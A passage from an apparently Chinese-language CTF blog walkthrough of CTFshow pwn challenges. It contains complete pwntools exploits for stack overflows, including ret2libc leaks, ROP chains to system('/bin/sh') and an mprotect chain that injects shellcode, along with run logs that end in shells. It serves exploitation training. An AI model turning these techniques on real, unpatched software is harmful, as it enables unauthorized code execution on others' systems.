write_addr)</span></span><br><span class="line"><span class="comment">#libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;O.o&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 175</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">0x7ffff7ebc560</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  </span><br></pre></td></tr></table></figure>

<h2 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h2><p>Hint：ez ret2libc</p>
<p>一个简单的ret2libc的应用，给出了很多函数的地址以及“&#x2F;bin&#x2F;sh”字符串的地址</p>
<p>先检查保护：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位程序关闭栈保护与PIE保护</p>
<p>IDA查看一下main函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give you some useful addr:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;puts: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fflush %p\n&quot;</span>, &amp;fflush);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;read: %p\n&quot;</span>, &amp;read);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;write: %p\n&quot;</span>, &amp;write);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, useful);                 <span class="comment">// &quot;/bin/sh&quot;</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到输出了puts fflush read write 函数的地址，以及一个useful的地址，跟进查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0804B028                 public useful</span><br><span class="line">.data:0804B028 useful          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: main+AF↑o</span><br></pre></td></tr></table></figure>

<p>发现是“&#x2F;bin&#x2F;sh”的地址</p>
<p>运行程序尝试看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Ez ret2libc!</span><br><span class="line">    * *************************************</span><br><span class="line">Give you some useful addr:</span><br><span class="line"></span><br><span class="line">puts: 0xf7df2140</span><br><span class="line">fflush 0xf7defd10</span><br><span class="line"><span class="built_in">read</span>: 0xf7e909a0</span><br><span class="line">write: 0xf7e91b80</span><br><span class="line">gift: 0x804b028</span><br><span class="line"></span><br><span class="line">Start your show <span class="keyword">time</span>:</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rhea@rhea-VMware-Virtual-Platform:~/Desktop/CTFshow_pwn/libc-database$ ./find write 0xf7e91b80 puts 0xf7df2140</span><br><span class="line">ubuntu-glibc (libc6_2.39-0ubuntu8.4_i386)</span><br></pre></td></tr></table></figure>

<p>确实如此，跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">152</span>]; <span class="comment">// [esp+Ch] [ebp-9Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Start your show time: &quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依旧是栈溢出漏洞</p>
<p>而且直接给出了各个函数的地址，那么就更加简单了，这里我们通过泄露目标程序中 puts 函数的地址，并使用 LibcSearcher 类搜索 libc 版本和计算system函数的地址。又已知gift就是“&#x2F;bin&#x2F;sh”字符串的地址，将其也接收下来最后再进行getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;puts:&quot;</span>)</span><br><span class="line">puts=<span class="built_in">eval</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">bin_sh=<span class="built_in">eval</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="comment">#puts=0xf7df2140</span></span><br><span class="line"><span class="comment">#bin_sh=0x804b028</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span>)  </span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;puts&quot;,puts)</span></span><br><span class="line"><span class="comment">#libc_base=puts-libc.dump(&quot;puts&quot;)</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&quot;system&quot;)</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x9c</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的我们详细分析这几行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;puts: &quot;</span>)</span><br><span class="line">puts = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span> , drop = <span class="literal">True</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">bin_sh = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span> , drop = <span class="literal">True</span>))</span><br></pre></td></tr></table></figure>

<p>发现跟之前写的exp有所不同，但是实际上得到的效果是一样的，按照之前的写法也没问题，这里</p>
<p>仅仅是为了演示多种不同的函数写法。</p>
<p>先使用 recvuntil 函数接收远程服务器发送的数据，直到遇到字符串 “puts: “ 。然后使用eval 函数执行接收到的字符串，将其解析为一个表达式并求值，得到 puts 函数的地址。类似地，下面这段代码接收数据，直到遇到字符串 “gift: “ 。然后使用 eval 函数执行接收到的字符串，得到一个地址，赋值给 bin_sh 变量。</p>
<p>其他的就应该没什么问题了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 333</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">Start your show <span class="keyword">time</span>:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\xa4\xdc\xf7</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn48"><a href="#pwn48" class="headerlink" title="pwn48"></a>pwn48</h2><p>Hint：没有write了，试试用puts吧，更简单了呢</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭栈保护与PIE</p>
<p>还是IDA查看一下main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;O.o?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">103</span>]; <span class="comment">// [esp+Dh] [ebp-6Bh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈溢出</p>
<p>套板子:</p>
<ol>
<li>利用puts函数去泄露libc版本</li>
<li>计算偏移量，算出程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li>
<li>利用溢出漏洞，构造rop，获取shell</li>
</ol>
<p>32位的相对来说比64位的还是简单一些，通过上面这些应该对32位跟64位的程序漏洞利用已经有了</p>
<p>一个区分了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x6b</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts=u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span>)  </span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"><span class="comment">#libc_base=puts-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh=lib_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x6b</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 401</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">0xf7df2140</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/libc-database/db/libc6_2.39-0ubuntu8.4_i386.so&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn49"><a href="#pwn49" class="headerlink" title="pwn49"></a>pwn49</h2><p>Hint：静态编译？或许你可以找找mprotect函数</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ file pwn &amp;&amp; checksec pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=db1e246fe40dca2886c2fe54a05b53299506f3fc, not stripped</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>statically linked可以看到是静态编译的，32位程序，仅关闭PIE（这里等下大家会发现有一个问题）</p>
<p>还是在这里先给大家解答一下这个疑问吧，这里检测到开启了栈保护，但是简单测试后发现并没有开启这个保护</p>
<p>但是这里为什么checksec的时候开启了保护呢？</p>
<p>原因在这，由于这是较老版本的checksec，它应该是检测到有这个函数就算打开了栈保护</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn _stack_chk_fail_local()</span><br><span class="line">&#123;</span><br><span class="line">  _fortify_fail_abort(<span class="number">0</span>, <span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在新版本的checksec中并不会出现此问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2148 Symbols	  No	0		0		./pwn</span><br></pre></td></tr></table></figure>

<p>这里的话看个人习惯，如果喜欢新版本的话可以自行去安装一个新版本的。</p>
<p>因此这里的话并没有开启栈保护。</p>
<p>IDA查看一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init_0();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是函数非常的多，从这我们也能看出来是静态编译</p>
<p>查找一下mprotect函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nsigned <span class="type">int</span> __cdecl <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addy, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = sys_mprotect(addy, len, flags);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0xFFFFF001</span> )</span><br><span class="line">    <span class="keyword">return</span> _syscall_error();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>确实有，那么它的作用是什么呢？</p>
<p>它的作用是能够修改内存的权限为可读可写可执行，然后我们就可以往栈上写入shellcode，执行</p>
<p>获取shell</p>
<table>
<thead>
<tr>
<th><strong>int mprotect(const void *start, size_t len, int prot);</strong></th>
</tr>
</thead>
<tbody><tr>
<td>第一个参数填的是一个地址，是指需要进行操作的地址。</td>
</tr>
<tr>
<td>第二个参数是地址往后多大的长度。</td>
</tr>
<tr>
<td>第三个参数的是要赋予的权限。</td>
</tr>
<tr>
<td>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</td>
</tr>
</tbody></table>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可写；</p>
<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
<p>5） <strong>prot&#x3D;7</strong> <strong>是可读可写可执行</strong></p>
<p>指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。</p>
<p>指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。 那么就</p>
<p>可以开始我们的操作了： 首先造成溢出，让程序跳转到mprotect函数地址，去执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(0x12+4) + p32(mprotect)</span><br></pre></td></tr></table></figure>

<p>Choose segment to jump(shift+F7),调出程序的段表，将0x80DA000地址开始修改为可读可写可执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got.plt	080DA000	080DA044	R	W	.	.	L	dword	0013	public	DATA	32	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	0014	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF</span><br><span class="line">.bss	080DB320	080DBFFC	R	W	.	.	L	align_32	0019	public	BSS	32	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	0014	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF</span><br></pre></td></tr></table></figure>

<p>为什么是0x80DA000而不是bss段的开头0x80DB320，因为指定的内存区间必须包含整个内存页（4K）,起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p>
<p>使用ROPgadget找到我们需要的ret指令，我们mprotect函数需要设置3个参数，这边就找到3个寄存器就行</p>
<p>由于是静态编译，这里的gadget非常多，因此我们需要更加精准的命令来帮助我们找到我们需要gadget,这里可以在后面用管道添加参数筛选一下： | grep pop</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary pwn --only <span class="string">&quot;pop|ret&quot;</span>|grep pop</span><br><span class="line">...</span><br><span class="line">0x080a019b : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>然后来设置mprotect的参数，将返回地址填上read函数，我们接下来要将shellcode读入程序段，需要继续控制程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += p32(pop_ebx_esi_ebp_ret) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line">payload += p32(read_addr)</span><br></pre></td></tr></table></figure>

<p>read函数原型:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>; </span><br></pre></td></tr></table></figure>

<p>fd 设为0时就可以从输入端读取内容 设为0</p>
<p>buf 设为我们想要执行的内存地址 设为我们已找到的内存地址0x80EB000</p>
<p>size 适当大小就可以 只要够读入shellcode就可以，设置大点无所谓</p>
<p>可以看到read函数也有三个参数要设置，我们就可以继续借用上面找到的有3个寄存器的ret指令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(M_addr)+p32(M_size)+p32(M_addr)</span><br></pre></td></tr></table></figure>

<p>到这里我们已经完成了修改内存为可读可写可执行，将程序重定向到了我们修改好后的内存地址，</p>
<p>接下来我们只要传入shellcode即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28185)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x80a019b</span> </span><br><span class="line">M_addr = <span class="number">0x80DA000</span></span><br><span class="line">M_size = <span class="number">0x1000</span>  <span class="comment">#0x80DA000 % 0x1000 == 0</span></span><br><span class="line">M_proc = <span class="number">0x7</span> <span class="comment">#可读可写可执行</span></span><br><span class="line">payload = cyclic(<span class="number">0x12</span>+<span class="number">4</span>) + p32(mprotect)</span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret) + p32(M_addr) + p32(M_size)+p32(M_proc)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(M_addr)+p32(M_size)+p32(M_addr)</span><br><span class="line"><span class="comment">#payload += p32(read_addr)  # 调用read函数</span></span><br><span class="line"><span class="comment">#payload += p32(pop_ebx_esi_ebp_ret)  # 用于设置read的参数</span></span><br><span class="line"><span class="comment">#payload += p32(0)  # fd = 0（标准输入）</span></span><br><span class="line"><span class="comment">#payload += p32(M_addr)  # buf = 0x80DA000（可执行内存区域）</span></span><br><span class="line"><span class="comment">#payload += p32(M_size)  # count = 0x1000（读取4096字节）</span></span><br><span class="line"><span class="comment">#payload += p32(M_addr)  # read执行后跳转到此地址（即shellcode起始地址）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 420</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn50"><a href="#pwn50" class="headerlink" title="pwn50"></a>pwn50</h2><p>Hint：好像哪里不一样了，远程libc环境 Ubuntu 18</p>
<p>可以继续使用ret2libc来完成这题，会更简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4007e3</span></span><br><span class="line">ret=<span class="number">0x4004fe</span>  <span class="comment">#注意是Ubuntu 18，有栈对齐问题</span></span><br><span class="line">payload=cyclic(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts=u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span>)  </span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span 